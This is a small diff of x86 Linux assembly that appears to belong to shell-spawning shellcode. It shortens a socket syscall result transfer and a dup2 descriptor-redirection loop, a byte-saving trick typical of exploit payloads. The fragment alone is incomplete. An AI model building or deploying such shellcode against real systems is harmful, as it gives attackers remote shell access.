@@ -53,14 +53,13 @@ _start:
 	mov ecx, esp
 	int 0x80
 
-	mov ebx, eax
+	xchg ebx, eax
 	
 	;dup2 for loop
 	xor ecx, ecx
 	mov cl, 2
 
 duploop:
-	xor eax, eax
 	mov al, 0x3f	
 	int 0x80
 	dec ecx
